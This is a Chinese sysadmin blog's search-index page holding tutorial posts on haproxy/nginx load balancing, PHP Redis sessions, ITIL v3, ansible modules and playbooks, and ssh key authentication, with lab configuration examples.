---&gt;保存文件注：添加完这个参数后，并不会立即消除告警，继续画图即可，一般10分钟后告警就没了 将拓扑图的流量由百分比改成 直接显示接口流量 1绘制拓扑图视图 ---&gt; Map Style ---&gt;Link Labels ---&gt;把Percentage改为Bits&#x2F;sec","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"cacti","slug":"cacti","permalink":"https://garywu520.github.io/tags/cacti/"},{"name":"weathermap","slug":"weathermap","permalink":"https://garywu520.github.io/tags/weathermap/"},{"name":"plugin","slug":"plugin","permalink":"https://garywu520.github.io/tags/plugin/"}]},{"title":"haproxy_nginx高可用负载均衡","slug":"keepalived-haproxy-nginx高可用负载均衡","date":"2017-09-04T12:55:17.000Z","updated":"2017-09-23T06:38:42.518Z","comments":true,"path":"2017/09/04/keepalived-haproxy-nginx高可用负载均衡/","link":"","permalink":"https://garywu520.github.io/2017/09/04/keepalived-haproxy-nginx%E9%AB%98%E5%8F%AF%E7%94%A8%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/","excerpt":"目录： 实验环境 Nginx预安装配置 haproxy原理、编译安装与配置","text":"目录： 实验环境 Nginx预安装配置 haproxy原理、编译安装与配置 实验环境123操作系统：CentOS7服务器：4台关闭firewalld和selinux 拓扑如下： Nginx 服务器配置[未特殊说明默认]在nginx1与nginx2同时配置 123456789101112131415161718192021221. 安装阿里云基本源 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;help&#x2F;centos2. 安装nginx yum install -y nginx3. 修改80端口为8080 vim &#x2F;etc&#x2F;nginx&#x2F;nginx.conf listen 8080 default_server; 4. 启动nginx systemctl enable nginx systemctl start nginx5. 简单配置用于区分nginx1与nginx2 Nginx1上配置： echo &quot;nginx1&quot; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html Nginx2上配置： echo &quot;nginx2&quot; &gt; &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;index.html6. 访问测试 haproxy 原理 haproxy是什么？ 1HAProxy是一个免费的负载均衡软件，HAProxy提供了L4(TCP)和L7(HTTP)两种负载均衡能力，具备丰富的功能。 haproxy的核心功能 123456789101. 负载均衡：L4和L7两种模式，支持RR&#x2F;静态RR&#x2F;LC&#x2F;IP Hash&#x2F;URI Hash&#x2F;URL_PARAM Hash&#x2F;HTTP_HEADER Hash等丰富的负载均衡算法2. 健康检查：支持TCP和HTTP两种健康检查模式3. 会话保持：对于未实现会话共享的应用集群，可通过Insert Cookie&#x2F;Rewrite Cookie&#x2F;Prefix Cookie，以及上述的多种Hash方式实现会话保持4. SSL：HAProxy可以解析HTTPS协议，并能够将请求解密为HTTP后向后端传输HTTP请求重写与重定向5. 监控与统计：HAProxy提供了基于Web的统计信息页面，展现健康状态和流量数据。基于此功能，使用者可以开发监控程序来监控HAProxy的状态 Haproxy主要工作模式 1231.tcp模式:该模式下，在客户端和服务器之间将建立一个全双工的连接，且不会对7层的报文做任何处理的简单模式。此模式默认，通常用于SSL、SSH、SMTP应用。2.http模式（一般使用）：该模式下，客户端请求在转发给后端服务器之前会被深度分析，所有不与RFC格式兼容的请求都会被拒绝。 Haproxy 8种负载均衡方法 1234567① roundrobin : 基于权重轮循。动态算法：支持权重的运行时调整，支持慢启动；仅支持最大4095个后端活动主机 ② static-rr : 基于权重轮循。静态算法：不支持权重的运行时调整及慢启动；但后端主机数量无限制③ source : 基于请求源IP的算法。对请求的源IP进行hash运算，然后将结果与后端服务器的权重总数想除后转发至某台匹配服务器。使同一IP客户端请求始终被转发到某特定的后端服务器。④ leastconn : 最小连接。（适合数据库负载均衡，不适合会话短的环境） ⑤ uri : 对部分或整体URI进行hash运算，再与服务器的总权重想除，最后转发到匹配后端。⑥ uri_param : 根据URL路径中参数进行转发，保证在后端服务器数量不变的情况下，同一用户请求分发到同一机器。⑦ hdr(&lt;name&gt;) : 根据http头转发，如果不存在http头。则使用简单轮循。 编译安装haproxy 官方下载地址：https://www.haproxy.org/download/1.7/src/ 1234567在两台haproxy上操作：yum groupinstall -y &quot;Development tools&quot;wget https:&#x2F;&#x2F;www.haproxy.org&#x2F;download&#x2F;1.7&#x2F;src&#x2F;haproxy-1.7.7.tar.gztar -zxvf haproxy-1.7.7.tar.gzcd haproxy-1.7.7make TARGET&#x3D;linux2628 ARCH&#x3D;X86_64 PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;haproxymake install PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;haproxy 123456789注意：TARGET&#x3D;Linux2628，TARGET则根据当前操作系统内核版本指定； ARCH&#x3D;X86_64 系统位数; PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;haproxy 指定安装路径;- linux22 for Linux 2.2- linux24 for Linux 2.4 and above (default)- linux24e for Linux 2.4 with support for a working epoll (&gt; 0.21)- linux26 for Linux 2.6 and above- linux2628 for Linux 2.6.28, 3.x, and above (enables splice and tproxy) 配置haproxy 12345创建管理用户useradd -s &#x2F;sbin&#x2F;nologin -M haproxy创建haproxy配置文件mkdir &#x2F;etc&#x2F;haproxy -p 创建haproxy.cfg配置文件 vim /etc/haproxy/haproxy.cfg 1234567891011Haproxy配置文件-区域介绍global 全局配置段 进程及安全配置相关的参数 性能调整相关参数 Debug相关参数（proxies 代理配置段） default 默认配置 （fronttend backend listen 三个的默认参数） frontend 前端 定义一系列监听套字节，接收客户端请求 backend 后端 定义一系列后端服务器，请求转发 listen 前后端直接关联 配置文件详解 1234567891011global chroot &#x2F;usr&#x2F;local&#x2F;haproxy #工作目录chroot log 127.0.0.1 local3 info #全局日志配置，使用127.0.0.1的rsyslog服务中local3日志设备，等级info maxconn 4096 #每个进程最大并发数 nbproc 1 #后台进程数量 user nobody group nobody daemon #后台程序模式工作 pidfile &#x2F;usr&#x2F;local&#x2F;haproxy&#x2F;haproxy.pid #HAProxy pid文件存储目录 #tune.bufsize 16384 #设置buffer(B) 123456789101112131415defaults mode http #默认的模式mode &#123;tcp|http|health&#125;; tcp是4层,http是7层,health只会返回OK retries 3 #连接后端服务器重试次数，超出后标为不可用 timeout connect 10S #连接服务器最长等待时间（ms） timeout client 20s #连接客户端发送数据最长等待时间。 timeout server 30s #服务器回复客户端最长等待时间。 timeout check 5s #对后端服务器的检测超时时间。 listen stats #定义haproxy web mode http bind 0.0.0.0:8888 stats enable stats uri &#x2F;haproxy-status stats auth haproxy:saltstack #配置haproxy web登陆的账户密码 1234567891011frontend http_80_in #定义前端虚拟节点名称 bind *:80 # bind [&lt;address&gt;:&lt;port_range&gt;] interface &lt;interface&gt; 监听socket套字节定义 mode http option httplog #启用日志记录HTTP请求。 option forwardfor #启用后后端服务器可以获得客户端IP option http-keep-alive #开启长连接 option httpclose #客户端和服务器完成一次连接请求后，HAProxy主动关闭TCP链接（优化选项） log global #使用全局日志配置 default_backend webserver #指定后端服务池（需要与backend定义webserver一致） 123456789101112131415161718192021222324backend webserver #定义后端服务池 mode http option redispatch #用于cookie保持环境。如后端服务器故障，客户端cookie不会刷新，用此来把用户请求强制定向到正常服务器 option abortonclose #负载均衡很高时，自动结束当前队列处理时间长的连接 balance roundrobin #负载均衡算法。 cookie SERVERID #允许向cookie插入SERVERID.下面server可以使用cookie定义 option httpchk GET &#x2F;index.php #启用HTTP服务状态检测功能 #option httpchk &lt;method&gt; &lt;url&gt; &lt;vesion&gt; #mothod: OPTION、GET、HEAD (其中HEAD仅检测是否返回状态码200 更快，更简单) server web1 192.168.1.186:80 cookie server1 weight 6 check inter 2000 rise 2 fall 3 server web2 192.168.1.188:80 cookie server2 weight 6 check inter 2000 rise 2 fall 3 说明：#server &lt;name&gt; &lt;address&gt;[:port] [param*] #[param*]为后端设定参数 #cookie server1 指定后端服务器设置cookie值，目的实现持久连接，指定的cookie值在请求时会被检查，第一次此cookie值将挑选后端服务器将一直被沿用。 #weight num权重 #check启用后端执行健康检测 #inter num 健康状态检测时间间隔 #rise num 从故障状态转换至正常需成功检测次数 #fall num 从正常转换故障需失败次数 #backup 设置后端真实服务器备份服务器，仅在所有真实服务器不可用启用 12345678910111213141516ACL权限#3、4层匹配 dst,src 目的IP和源IP（写入frontend中）#禁止192.168.0.0&#x2F;24网段用户访问 acl bad src 192.168.0.0&#x2F;24block if bad #七层匹配 req.hdr([&lt;&gt;name[,&lt;occ&gt;])#用户访问www.server2.com时(报头正则匹配)，代理转发给server2 -i是不区分大小写acl www hdr_reg(host) -i ^(www.server2.com)$use_backend server2 if www#acl其他设置acl url_static path_end .git .png .css .js （URL请求结尾）acl host_www hdr_beg(host) -i wwwacl host_static hdr_beg(host) -i img. video. download. ftp. (域名开头) 日志配置 12345678vim &#x2F;etc&#x2F;rsyslog.d&#x2F;haproxy.conf$ModLoad imudp $UDPServerRun 514local3.* &#x2F;var&#x2F;log&#x2F;haproxysystemctl restart rsyslog注：需要重启haproxy服务 配置文件参考： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748global chroot &#x2F;usr&#x2F;local&#x2F;haproxy log 127.0.0.1 local3 info maxconn 100000 nbproc 1 user haproxy group haproxy daemon pidfile &#x2F;usr&#x2F;local&#x2F;haproxy&#x2F;haproxy.pid defaults mode http maxconn 100000 option http-keep-alive retries 3 timeout connect 10s timeout client 20s timeout server 30s timeout check 5slisten stats mode http bind 0.0.0.0:8888 stats enable stats uri &#x2F;haproxy-status stats auth haproxy:saltstackfrontend http_80_in bind 10.10.10.25:80 mode http option httplog option forwardfor #option httpclose log global default_backend webserver backend webserver mode http option redispatch option abortonclose balance roundrobin cookie SERVERID option httpchk HEAD &#x2F; HTTP&#x2F;1.0 server nginx1 10.10.10.23:8080 cookie nginx1 weight 6 check inter 2000 rise 2 fall 3 server nginx2 10.10.10.24:8080 cookie nginx2 weight 6 check inter 2000 rise 2 fall 3 #server nginx2 10.10.10.30:8080 cookie site.test.com backup 启动haproxy 1234567891011121314#启动&#x2F;usr&#x2F;local&#x2F;haproxy&#x2F;sbin&#x2F;haproxy -f &#x2F;etc&#x2F;haproxy&#x2F;haproxy.cfg #检查ps -ef |grep haproxylsof -i:80#访问测试http:&#x2F;&#x2F;10.10.10.25http:&#x2F;&#x2F;10.10.10.26http:&#x2F;&#x2F;10.0.10.25:8888&#x2F;haproxy-statushttp:&#x2F;&#x2F;10.0.10.26:8888&#x2F;haproxy-status#hatop工具可以查看haproxy工作状态，界面类似top haproxy_web","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"nginx","slug":"nginx","permalink":"https://garywu520.github.io/tags/nginx/"},{"name":"lvs","slug":"lvs","permalink":"https://garywu520.github.io/tags/lvs/"},{"name":"负载均衡","slug":"负载均衡","permalink":"https://garywu520.github.io/tags/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"},{"name":"keepalived","slug":"keepalived","permalink":"https://garywu520.github.io/tags/keepalived/"},{"name":"haproxy","slug":"haproxy","permalink":"https://garywu520.github.io/tags/haproxy/"}]},{"title":"PHP分布式Redis实现session","slug":"PHP分布式Redis实现session","date":"2017-09-03T05:23:32.000Z","updated":"2017-09-07T12:24:55.632Z","comments":true,"path":"2017/09/03/PHP分布式Redis实现session/","link":"","permalink":"https://garywu520.github.io/2017/09/03/PHP%E5%88%86%E5%B8%83%E5%BC%8FRedis%E5%AE%9E%E7%8E%B0session/","excerpt":"session两种-实现原理","text":"session两种-实现原理 基于cookie实现session 12345Session对象的原理在于，服务器可以为客户端创建并维护一个所谓的Session对象，用于存放数据。在创建Session对象的同时，服务 器将会为该Session对象产生一个唯一编号，这个编号称之为SessionID，服务器以Cookie的方式将SessionID存放在客户端。当浏 览器再次访问该服务器时，会将SessionID作为Cookie信息带到服务器，服务器可以通过该SessionID检索到以前的Session对象， 并对其进行访问。需要注意的是，此时的Cookie中仅仅保存了一个SessionID，而相对较多的会话数据保存在服务器端对应的Session对象 中，由服务器来统一维护，这样一定程度保证了会话数据安全性，但增加了服务器端的内存开销。存放在客户端的用于保存SessionID的Cookie会在浏览器关闭时清除。我们把用户打开一个浏览器访问某个应用开始，到关闭浏览器为止交互过程称 为一个“会话”。在一个“会话”过程中，可能会向同一个应用发出了多次请求，这些请求将共享一个Session对象，因为这些请求携带了相同的 SessionID信息。 基于URL重写 123456Session对象的正常使用要依赖于Cookie。如果考虑到客户端浏览器可能出于安全的考虑禁用了Cookie，应该使用URL重写的方式使Session在客户端禁用Cookie的情况下继续生效。注意：由于Cookie的禁用，这次请求协议头中虽然没有携带SessionID的信息，但SessionID的信息作为请求地址的一部分传到了服务器端，这就是URL重写的意义所在。response(译中文: 反应&#x2F;回答)的encodeURL方法将根据浏览器是否不支持Cookie决定是否将SessionID信息写入链接地址。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"redis","slug":"redis","permalink":"https://garywu520.github.io/tags/redis/"},{"name":"php","slug":"php","permalink":"https://garywu520.github.io/tags/php/"},{"name":"cookie","slug":"cookie","permalink":"https://garywu520.github.io/tags/cookie/"},{"name":"memcached","slug":"memcached","permalink":"https://garywu520.github.io/tags/memcached/"}]},{"title":"ITIL v3凸显IT服务价值","slug":"ITIL-v3凸显IT服务价值","date":"2017-09-03T04:42:33.000Z","updated":"2017-09-03T04:47:24.790Z","comments":true,"path":"2017/09/03/ITIL-v3凸显IT服务价值/","link":"","permalink":"https://garywu520.github.io/2017/09/03/ITIL-v3%E5%87%B8%E6%98%BEIT%E6%9C%8D%E5%8A%A1%E4%BB%B7%E5%80%BC/","excerpt":"英国商务部（OGC）从20世纪80年代开始组织开发的用于解决此类问题的IT管理标准体系－ITIL（Information Technology Infrastructure Library信息技术基础架构库）。经过近20年的发展，现在已经风靡全球，并在包括政府、企业和非营利组织中得到了广泛的支持与应用。","text":"英国商务部（OGC）从20世纪80年代开始组织开发的用于解决此类问题的IT管理标准体系－ITIL（Information Technology Infrastructure Library信息技术基础架构库）。经过近20年的发展，现在已经风靡全球，并在包括政府、企业和非营利组织中得到了广泛的支持与应用。 ITILv3用生命周期的概念将各个管理流程有机地贯穿在了一起：以服务策略为指导，从服务设计开始，通过服务转移模块将基于服务战略设计的服务产品以受控的方式导入生产环境，然后通过服务运营模块为服务在生产环境中的运营支持提供指导，整个过程井然有序，同时伴随着持续服务改进，用以提高各个模块的执行的效率和效果。 ITIL v3的重点从操作转向IT服务，这使得ITIL更加实用，而且有助于提高IT的整体商业价值。 ITIL的精髓是“PPT”：人（People）、流程（Process）、技术（Technology）： 1) 人（People）：人员素质关系到服务质量的高低； 2) 流程（Process）：标准流程负责监控IT服务的运行状况； 3) 技术（Technology）：技术则保证服务的质量和效率。 一个好的IT服务管理系统，应该是组织、流程等管理范畴和技术架构、管理工具等技术范畴的结合，以客户为中心，以流程为导向，分析服务提供元素，明确各项工作实施目标，落实到具体人员去实施，提供符合服务级别协议服务。 参考来源：搜狐IT","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://garywu520.github.io/tags/%E9%9A%8F%E7%AC%94/"},{"name":"IT","slug":"IT","permalink":"https://garywu520.github.io/tags/IT/"},{"name":"ITIL","slug":"ITIL","permalink":"https://garywu520.github.io/tags/ITIL/"},{"name":"PPT","slug":"PPT","permalink":"https://garywu520.github.io/tags/PPT/"}]},{"title":"ansible自动化-实现(较全)","slug":"ansible自动化-实现-较全","date":"2017-09-02T04:00:09.000Z","updated":"2017-09-02T10:46:55.916Z","comments":true,"path":"2017/09/02/ansible自动化-实现-较全/","link":"","permalink":"https://garywu520.github.io/2017/09/02/ansible%E8%87%AA%E5%8A%A8%E5%8C%96-%E5%AE%9E%E7%8E%B0-%E8%BE%83%E5%85%A8/","excerpt":"ansible介绍 12ansible批量自动化管理软件, 约200-300台机器可以使用ansible来完成自动化。高于这个数量需要使用性能更强&#x2F;效率更高的saltstack，而saltstack需要安装相应客户端","text":"ansible介绍 12ansible批量自动化管理软件, 约200-300台机器可以使用ansible来完成自动化。高于这个数量需要使用性能更强&#x2F;效率更高的saltstack，而saltstack需要安装相应客户端 官方说明： 12345ansible软件相关参考链接信息http:&#x2F;&#x2F;docs.ansible.com&#x2F;ansible&#x2F;intro_installation.html http:&#x2F;&#x2F;www.ansible.com.cn&#x2F; http:&#x2F;&#x2F;docs.ansible.com&#x2F;modules_by_category.html http:&#x2F;&#x2F;www.ansible.cn&#x2F;docs&#x2F; 控制端-安装ansible 123451.安装阿里云epel yum源 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F; 2.安装ansible yum install -y ansible 被控端服务器-安装libselinux-python 12所有被管理端需要安装libselinux-python软件yum install libselinux-python -y 配置文件 12345[root@web01 ~]# cd &#x2F;etc&#x2F;ansible&#x2F;[root@web01 ~]# vim hosts #添加要管理的服务器，并定义一个组模块，类似于rsync[oldboy]172.16.1.31172.16.1.41 ansible命令格式 123命令格式：ansible oldboy -m command -a &quot;hostname&quot; 命令 主机组 指定模块 要执行的命令 123查下命令，执行ansible命令后，没有发生改变，会显示绿色执行ansible命令，发生配置改变时，表示黄色执行ansible命令，出现异常表示红色 command模块（命令模块） 12345678910示例: [root@web01 ansible]# ansible oldboy -m command -a &quot;hostname&quot;172.16.1.41 | SUCCESS | rc&#x3D;0 &gt;&gt;backup172.16.1.31 | SUCCESS | rc&#x3D;0 &gt;&gt;nfs01[root@web01 ansible]# ansible oldboy -a &quot;df -h&quot; copy模块 （拷贝文件） 123456789101112131415161718示例：ansible oldboy -m copy -a &quot;src&#x3D;&#x2F;etc&#x2F;hosts dest&#x3D;&#x2F;tmp&#x2F;host_oldboy backup&#x3D;yes&quot;ansible oldboy -m copy -a &quot;src&#x3D;&#x2F;etc&#x2F;hosts dest&#x3D;&#x2F;tmp&#x2F;host_oldboy owner&#x3D;oldboy group&#x3D;oldboy mode&#x3D;600&quot;参数：backup 文件复制之前，如果目标存在，则先进行备份，再进行拷贝覆盖owner&#x3D;oldboy 定义用户属主（注意：指定的用户需要存在，否则报错）group&#x3D;oldboy 定义用户属组mode&#x3D;600 定义文件权限权限示例：ansible oldboy -m copy -a &quot;src&#x3D;&#x2F;etc&#x2F;hosts dest&#x3D;&#x2F;tmp&#x2F;a&#x2F;b&#x2F;c&#x2F; backup&#x3D;yes&quot;其中“&#x2F;tmp&#x2F;a&#x2F;b&#x2F;c&#x2F;”目录可以没有，ansible可以自动创建。但是，不能在没有的目录下重命名，比如：[错误的命令，仅用于示范]ansible oldboy -m copy -a &quot;src&#x3D;&#x2F;etc&#x2F;hosts dest&#x3D;&#x2F;tmp&#x2F;a&#x2F;b&#x2F;c&#x2F;new_hosts backup&#x3D;yes&quot; shell模块 1234567891011121314shell模块--是万能模块,支持正则或特殊符号信息比如：ansible oldboy -m shell -a &quot;ls -l &#x2F;etc&#x2F;*&quot;##########################################先定义一个简单脚本：[root@web01 scripts]# cat yum.sh#!&#x2F;bin&#x2F;bashyum install -y htop脚本分发并给脚本执行权限：ansible oldboy -m copy -a &quot;src&#x3D;&#x2F;server&#x2F;scripts&#x2F;yum.sh dest&#x3D;&#x2F;server&#x2F;scripts&#x2F; mode&#x3D;655&quot;远程批量执行脚本ansible oldboy -m shell -a &quot;sh &#x2F;server&#x2F;scripts&#x2F;yum.sh&quot; script模块-只能执行脚本 1234# 利用script模块在远程执行本地脚本ansible oldboy -m script -a &quot;&#x2F;server&#x2F;scripts&#x2F;yum.sh&quot; 注:需要使用绝对路径方式执行脚本 yum模块 12345ansible oldboy -m yum -a &quot;name&#x3D;htop state&#x3D;installed&quot;注：name&#x3D;htop 指定安装软件包的名称state&#x3D;installed 指定安装动作 service模块 12345678910#控制服务的状态信息，比如重启、停止等。ansible oldboy -m service -a &quot;name&#x3D;crond state&#x3D;stopped enabled&#x3D;no&quot;检查：ansible oldboy -m shell -a &quot;&#x2F;etc&#x2F;init.d&#x2F;crond status&quot;ansible oldboy -m shell -a &quot;chkconfig --list|grep cron&quot;##########################################################state状态选择：running,started,stopped,restarted,reloadedenabled开机自启动，yes或no file模块 1234567891011121314151617#创建软连接ansible oldboy -m file -a &quot;src&#x3D;&#x2F;etc&#x2F;hosts dest&#x3D;&#x2F;tmp&#x2F;hosts state&#x3D;link&quot;参数：owner 定义文件&#x2F;目录属组group 定义文件&#x2F;目录属主mode 定义文件&#x2F;目录权限PATH 定义文件&#x2F;目录路径dest 在远端创建文件或目录sate directory 如果目录不存在就创建目录 file 即使文件不存在，也不会被创建 link 创建软链接 hard 创建硬链接 touch 创建文件 absent 删除目录、文件或取消链接文件 cron模块-定时任务模块 123456789101112131415161718192021#批量创建定时任务--每天凌晨0点整执行yum.sh脚本ansible oldboy -m cron -a &#39;name&#x3D;install_htop minute&#x3D;0 hour&#x3D;0 job&#x3D;&quot;&#x2F;bin&#x2F;sh &#x2F;server&#x2F;scripts&#x2F;yum.sh &amp;&gt;&#x2F;dev&#x2F;null&quot;&#39;#批量删除定时任务ansible oldboy -m cron -a &#39;state&#x3D;absent name&#x3D;install_htop minute&#x3D;0 hour&#x3D;0 job&#x3D;&quot;&#x2F;bin&#x2F;sh &#x2F;server&#x2F;scripts&#x2F;yum.sh &amp;&gt;&#x2F;dev&#x2F;null&quot;&#39;#注释cron任务ansible oldboy -m cron -a &#39;name&#x3D;install_htop minute&#x3D;0 hour&#x3D;0 job&#x3D;&quot;&#x2F;bin&#x2F;sh &#x2F;server&#x2F;scripts&#x2F;yum.sh &amp;&gt;&#x2F;dev&#x2F;null&quot; disabled&#x3D;yes&#39;#启用被注释的cron任务ansible oldboy -m cron -a &#39;name&#x3D;install_htop minute&#x3D;0 hour&#x3D;0 job&#x3D;&quot;&#x2F;bin&#x2F;sh &#x2F;server&#x2F;scripts&#x2F;yum.sh &amp;&gt;&#x2F;dev&#x2F;null&quot; disabled&#x3D;no&#39;name 定义一个cron任务名称。如果不指定名称的话，ansible命令执行多次，会多次追加state&#x3D;absent 删除计划任务disabled 注释crontabjob 指定任务minute 分钟,0-59hour 小时，0-23day 日, 1-31month 月, 1-12weekday 周, 0-6 ping模块 123456[root@web01 ~]# ansible all -m ping172.16.1.41 | SUCCESS &#x3D;&gt; &#123; &quot;changed&quot;: false, &quot;ping&quot;: &quot;pong&quot;注：如果ping正确，则返回结果“pong” 查看ansible帮助信息 12ansible-doc -s shell 查看指定模块用法ansible-doc -l 列出所有模块 基于密码方式实现ansible管理 123456789101112我们上面所有的操作均是基于密钥的管理如果个别服务器不希望通过密钥来访问，那ansible如何管理呢？vim &#x2F;etc&#x2F;ansible&#x2F;hosts 172.16.1.31 ansible_ssh_user&#x3D;root ansible_ssh_pass&#x3D;123456意思是：ansible管理这台31服务器时，使用ssh的root用户登录那么有人可能又说了，密码写在文档里，很不安全，怎么办？vim &#x2F;etc&#x2F;ansible&#x2F;hosts 172.16.1.31 ansible_ssh_user&#x3D;root这样定义，然后在执行ansible命令的时候，密码自己输入 ansible 剧本（playbooks）功能 剧本格式： 12345### 剧本的开头，可以不写- hosts:空格 all #此处all表示所有主机，也可以指定主机模块名称 tasks： - 模块: 要执行的命令 用于ansible/saltstack编写剧本所使用的语言格式：pyYAML 定义剧本 1234567891011创建剧本存放目录[root@web01 ~]# mkdir &#x2F;etc&#x2F;ansible&#x2F;ansible_playbook[root@web01 ansible_playbook]# vim cron.yml- hosts: all tasks: - cron: name&#x3D;install_htop minute&#x3D;0 hour&#x3D;0 job&#x3D;&quot;&#x2F;bin&#x2F;sh &#x2F;server&#x2F;scripts&#x2F;yum.sh &#x2F;dev&#x2F;null&quot;#执行剧本ansible-playbook cron.yml 剧本格式检查命令 1ansible-playbook --syntax-check cron.yml 模拟执行剧本 1ansible-playbook -C cron.yml 多任务剧本–编写–不同主机多任务 12345678910111213# more tasks- hosts: 172.16.1.41 tasks: - name: cron task cron: name&#x3D;install_htop minute&#x3D;0 hour&#x3D;0 job&#x3D;&quot;&#x2F;bin&#x2F;sh &#x2F;server&#x2F;scripts&#x2F;yum.sh &#x2F;dev&#x2F;null&quot; - name: hostname task shell: echo $HOSTNAME &gt;&gt;&#x2F;tmp&#x2F;hostname.txt - hosts: 172.16.1.31 tasks: - name: yum install nfs-utils task shell: yum install -y nfs-utils rpcbind 注：- name前面共计4个空格 剧本编写模式 1234剧本编写方式01 多主机单任务编写方式02 多主机多任务编写方式03 不同主机多任务编写方式 环境测试 1234要求利用ansible剧本安装rsync服务器 01. 重新克隆两台主机，一台作为rsync服务端 -台作为rsync客户端02. 利用ansible管理主机（编写剧本），部署rsync服务端，与rsync客户端03. rsync客户端主机不需分发公钥文件，实现ansible管理 123456789101112131415161718192021222324剧本参考:# command play-book- hosts: 172.16.1.41 tasks: - name: step01:install rsync yum: name&#x3D;rsync state&#x3D;installed - name: step02:edit rsync conf file copy: src&#x3D;&#x2F;etc&#x2F;ansible&#x2F;conf&#x2F;rsync_conf&#x2F;rsyncd.conf dest&#x3D;&#x2F;etc&#x2F; - name: step03:create rsync user shell: userdel -r rsync &amp;&amp; useradd rsync -s &#x2F;sbin&#x2F;nologin -M - name: step04:create auth file copy: src&#x3D;&#x2F;etc&#x2F;ansible&#x2F;conf&#x2F;rsync_conf&#x2F;rsync.password dest&#x3D;&#x2F;etc&#x2F; mode&#x3D;600 - name: step05:create backup dir file: dest&#x3D;&#x2F;backup state&#x3D;directory owner&#x3D;rsync group&#x3D;rsync - name: step06:boot rsync server shell: rsync --daemon- hosts: 172.16.1.31 tasks: - name: step01:set auth info shell: export RSYNC_PASSWORD&#x3D;oldboy123 #注:ansible定义环境变量不生效，此行无效 - name: step02:create auth file copy: src&#x3D;&#x2F;etc&#x2F;ansible&#x2F;conf&#x2F;rsync_conf&#x2F;rsync_client.password dest&#x3D;&#x2F;etc&#x2F;rsync.password mode&#x3D;600","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"ansible","slug":"ansible","permalink":"https://garywu520.github.io/tags/ansible/"},{"name":"saltstack","slug":"saltstack","permalink":"https://garywu520.github.io/tags/saltstack/"},{"name":"自动化","slug":"自动化","permalink":"https://garywu520.github.io/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"剧本","slug":"剧本","permalink":"https://garywu520.github.io/tags/%E5%89%A7%E6%9C%AC/"},{"name":"playbooks","slug":"playbooks","permalink":"https://garywu520.github.io/tags/playbooks/"},{"name":"ssh","slug":"ssh","permalink":"https://garywu520.github.io/tags/ssh/"},{"name":"批量自动化管理","slug":"批量自动化管理","permalink":"https://garywu520.github.io/tags/%E6%89%B9%E9%87%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E7%AE%A1%E7%90%86/"}]},{"title":"ssh基于密钥的安全认证","slug":"ssh基于密钥的安全认证","date":"2017-09-02T01:56:08.000Z","updated":"2017-09-02T03:58:15.465Z","comments":true,"path":"2017/09/02/ssh基于密钥的安全认证/","link":"","permalink":"https://garywu520.github.io/2017/09/02/ssh%E5%9F%BA%E4%BA%8E%E5%AF%86%E9%92%A5%E7%9A%84%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81/","excerpt":"ssh密钥登陆实质及过程 123456ssh服务分发公钥实质执行过程 ①. 管理服务器创建私钥和公钥（密钥对） ②. 将公钥文件远程传送复制到被管理服务器相应用户~&#x2F;.ssh&#x2F;id_dsa.pub下，并修改.ssh目录权限为700 ③. 修改公钥文件文件名称为authorized_keys(默认文件名，可在配置文件修改)，授权权限为600 ④. 利用ssh服务配置文件的配置参数，进行识别公钥文件authorized_keys ⑤. 进而实现基于密钥远程登录服务器（免密码登录&#x2F;非交互方式登录）","text":"ssh密钥登陆实质及过程 123456ssh服务分发公钥实质执行过程 ①. 管理服务器创建私钥和公钥（密钥对） ②. 将公钥文件远程传送复制到被管理服务器相应用户~&#x2F;.ssh&#x2F;id_dsa.pub下，并修改.ssh目录权限为700 ③. 修改公钥文件文件名称为authorized_keys(默认文件名，可在配置文件修改)，授权权限为600 ④. 利用ssh服务配置文件的配置参数，进行识别公钥文件authorized_keys ⑤. 进而实现基于密钥远程登录服务器（免密码登录&#x2F;非交互方式登录） 客户端创建密钥对 1234567891011121314151617181920212223242526272829303132注： -t 参数指定密钥类型，有dsa、rsa1和rsa,其中rsa是版本2[root@01 ~]# ssh-keygen -t dsaGenerating public&#x2F;private dsa key pair.Enter file in which to save the key (&#x2F;root&#x2F;.ssh&#x2F;id_dsa):Created directory &#39;&#x2F;root&#x2F;.ssh&#39;.Enter passphrase (empty for no passphrase):Enter same passphrase again: Your identification has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_dsa.Your public key has been saved in &#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub.The key fingerprint is:25:93:78:e9:01:2d:82:db:cb:0b:34:f7:0c:a9:1b:11 root@web01The key&#39;s randomart image is:+--[ DSA 1024]----+| . .. || E . .o.o || + o..B . || &#x3D; &#x3D; o &#x3D; || . * &#x3D; S || + o o || + . || . . || |+-----------------+#检查密钥文件[root@web01 ~]# ll &#x2F;root&#x2F;.ssh&#x2F;total 8-rw------- 1 root root 736 2017-08-06 15:17 id_dsa-rw-r--r-- 1 root root 600 2017-08-06 15:17 id_dsa.pub 将id_dsa.pub公钥分发到被管理的服务器 123456789101112命令格式：ssh-copy-id [-i [identity_file]] [user@]machine[root@01 ~]# ssh-copy-id -i ~&#x2F;.ssh&#x2F;id_dsa.pub root@172.16.1.31#输入远端root密码即可正常传输#远端服务器分发路径：[root@backup ~]# ll 